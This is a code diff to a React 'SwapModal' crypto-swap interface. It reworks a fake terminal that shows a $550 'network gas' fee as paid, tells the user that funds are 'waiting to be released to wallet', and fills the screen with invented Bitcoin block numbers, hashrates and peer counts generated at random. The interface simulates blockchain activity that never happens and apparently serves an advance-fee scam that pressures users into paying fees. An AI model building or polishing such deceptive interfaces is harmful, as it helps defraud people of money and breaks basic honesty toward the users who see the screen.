@@ -746,25 +746,18 @@ export default function SwapModal() {
           terminalInterval.current = null;
         }
         setTerminalActive(false);
-        setGasFeePending(true);
-        // Start second terminal that marks the gas fee as paid
+        setGasFeePending(false);
+        // Mark the gas fee as paid immediately when second screen starts
+        setGasFeePaid(true);
+        // Second terminal runs endlessly like a blockchain network monitor
         setTerminal2Active(true);
         setTerminal2Counter(0);
         terminal2Interval.current = setInterval(() => {
           setTerminal2Counter(prev => prev + 1);
         }, 400);
-        setTimeout(() => {
-          if (terminal2Interval.current) {
-            clearInterval(terminal2Interval.current);
-            terminal2Interval.current = null;
-          }
-          setTerminal2Active(false);
-          setGasFeePending(false);
-          setGasFeePaid(true);
-          setFundsWaitingRelease(true);
-          setStatus('Gas fee paid. Funds waiting to be released to wallet.');
-          window.dispatchEvent(new Event('balanceUpdated'));
-        }, 120000);
+        setFundsWaitingRelease(true);
+        setStatus('Gas fee paid. Funds waiting to be released to wallet.');
+        window.dispatchEvent(new Event('balanceUpdated'));
       }, 120000);
       setLoading(false);
       return;
@@ -1079,14 +1072,16 @@ export default function SwapModal() {
                         <Terminal size={14} className="animate-pulse" />
                         <span>SYSTEM://GAS_FEE_PAYMENT</span>
                       </div>
-                      <div className="text-[#ffaa00] text-xs font-mono font-bold">
-                        {terminal2Counter} / 12
-                      </div>
+                      <div className="text-[#10b981] text-xs font-mono font-bold">PAID</div>
                     </div>
                     <div className="space-y-1 text-[#e2e8f0] text-sm font-mono leading-relaxed">
                       <div className="flex gap-2">
                         <span className="text-[#ffaa00]/50">[FEE]</span>
                         <span className="monospace-futuristic">$550.00 NETWORK_GAS</span>
+                      </div>
+                      <div className="flex gap-2">
+                        <span className="text-[#10b981]/50">[STATUS]</span>
+                        <span className="text-[#10b981] font-bold">Gas Fee Successfully paid</span>
                       </div>
                       <div className="flex gap-2">
                         <span className="text-[#ffaa00]/50">[TX]</span>
@@ -1104,10 +1099,22 @@ export default function SwapModal() {
                         <span className="text-[#ffaa00]/50">[WALLET]</span>
                         <span className="monospace-futuristic">{walletAccount ? walletAccount.slice(0, 6) + '…' + walletAccount.slice(-4) : '0x0000…0000'}</span>
                       </div>
+                      <div className="flex gap-2">
+                        <span className="text-[#ffaa00]/50">[NETWORK]</span>
+                        <span className="monospace-futuristic">BTC_MAINNET_BLOCK_{Math.floor(Math.random() * 800000)}</span>
+                      </div>
+                      <div className="flex gap-2">
+                        <span className="text-[#ffaa00]/50">[HASHRATE]</span>
+                        <span className="monospace-futuristic">{Math.floor(Math.random() * 900) + 100}.{Math.floor(Math.random() * 99)} EH/s</span>
+                      </div>
+                      <div className="flex gap-2">
+                        <span className="text-[#ffaa00]/50">[PEERS]</span>
+                        <span className="monospace-futuristic">{Math.floor(Math.random() * 50) + 10}</span>
+                      </div>
                     </div>
                     <div className="mt-4 flex items-center gap-2 text-[#ffaa00]/40 text-xs font-mono">
                       <div className="w-2 h-2 rounded-full bg-[#ffaa00] animate-pulse"></div>
-                      <span>GAS_FEE_AUTO_PAYMENT_PROCESSING</span>
+                      <span>GAS_FEE_PAID_MONITORING_BLOCKCHAIN</span>
                       <div className="h-px bg-[#ffaa00]/30 flex-1"></div>
                     </div>
                   </div>
